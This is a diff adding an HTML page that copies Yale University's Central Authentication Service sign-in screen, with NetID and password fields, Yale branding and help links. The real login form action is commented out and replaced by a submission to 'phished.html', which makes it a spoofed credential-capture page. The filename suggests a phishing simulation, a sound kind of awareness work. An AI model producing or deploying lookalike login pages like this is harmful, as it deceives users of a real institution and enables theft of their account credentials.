@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Central Authentication Service | Yale University</title>
+  <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="./styles-no-js.css">
+</head>
+<body>
+  <main class="page-shell" aria-labelledby="page-title">
+    <header class="page-header">
+      <h1 id="page-title">Central Authentication Service</h1>
+    </header>
+
+    <nav class="top-links" aria-label="Account and help links">
+      <a href="https://veritas.its.yale.edu/netid/" target="_blank" rel="noopener">Manage NetID Account</a>
+      <a href="https://helpme.yale.edu" target="_blank" rel="noopener">Help</a>
+    </nav>
+
+    <div class="content-grid">
+      <section class="sign-in-panel" aria-labelledby="sign-in-title">
+        <h2 id="sign-in-title">Sign In</h2>
+
+        <!-- <form class="sign-in-form" method="post" action="login"> -->
+        <form class="sign-in-form" action="phished.html">
+          <label for="username">NetID</label>
+          <input id="username" name="username" type="text" autocomplete="off" autocapitalize="none" spellcheck="false" required>
+
+          <label for="password">Password</label>
+          <input id="password" name="password" type="password" autocomplete="off" required>
+
+          <!-- CAS should generate this value on the server. Do not hard-code a captured/stale execution token. -->
+          <input type="hidden" name="execution" value="">
+          <input type="hidden" name="_eventId" value="submit">
+
+          <a class="forgot-password" href="https://veritas.its.yale.edu/netid/forgot-password" target="_blank" rel="noopener">Forgot My Password</a>
+
+          <button class="btn-submit" name="submitBtn" accesskey="l" type="submit">Sign In</button>
+        </form>
+      </section>
+
+      <aside class="info-container" aria-labelledby="security-title">
+        <h2 id="security-title">Make sure your session is secure</h2>
+        <p>Before entering your NetID and password, verify that the URL for this page begins with:</p>
+        <p><strong>https://secure.its.yale.edu</strong></p>
+        <p>To protect your privacy, quit your web browser when you are finished with your session.</p>
+      </aside>
+    </div>
+
+    <footer class="page-footer">
+      <div class="footer-content">
+        <img class="footer-image" src="./images/yale-logo-sprite.svg" alt="Yale University">
+        <p>Copyright &copy; 2026 <a href="https://www.yale.edu/" target="_blank" rel="noopener">Yale University</a>.<br>All Rights Reserved.</p>
+      </div>
+      <nav class="footer-links" aria-label="Footer links">
+        <a href="https://usability.yale.edu/web-accessibility/accessibility-yale" target="_blank" rel="noopener">Accessibility at Yale</a>
+        <a href="https://www.yale.edu/privacy-policy" target="_blank" rel="noopener">Privacy Policy</a>
+      </nav>
+    </footer>
+  </main>
+</body>
+</html>
